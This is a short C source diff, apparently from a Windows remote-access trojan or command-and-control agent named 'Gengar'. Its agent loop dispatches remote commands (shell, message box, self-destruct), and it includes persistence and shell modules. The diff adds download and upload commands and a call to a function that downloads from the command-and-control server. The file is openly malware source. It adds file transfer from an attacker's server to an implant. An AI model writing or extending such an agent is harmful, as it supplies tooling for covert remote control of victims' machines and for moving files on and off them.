@@ -3,6 +3,7 @@
 #include <windows.h>
 
 #include "client.h"
+#include "file.h"
 #include "persistance.h"
 #include "shell.h"
 
@@ -10,7 +11,7 @@
 #define MSGBOX_BUFSIZE 1024
 #define SHELL_CMD_BUFSIZE 4096
 
-enum cmd_types { SHELL, MSGBOX, SUICIDE };
+enum cmd_types { SHELL, MSGBOX, DOWNLOAD, UPLOAD, SUICIDE };
 
 void handle_shell() {
   char *cmd, *out;
@@ -47,6 +48,9 @@ void start_agent() {
         break;
       case SUICIDE:
         kill_gengar();
+        break;
+      case DOWNLOAD:
+        download_from_cnc();
         break;
     }
   }
